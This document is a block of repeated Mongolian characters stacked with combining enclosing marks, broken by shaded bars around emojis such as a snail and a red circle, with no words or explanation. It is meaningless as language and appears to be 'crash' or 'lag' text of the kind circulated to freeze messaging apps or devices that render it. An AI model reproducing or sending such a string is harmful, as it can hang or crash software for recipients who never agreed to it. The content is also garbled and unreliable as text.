ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░░▒▓█▇▆▅▄▃▂😳▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔴▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🐌▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🤣▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂😰🤼ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░░▒▓█▇▆▅▄▃▂😳▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔴▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🐌▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ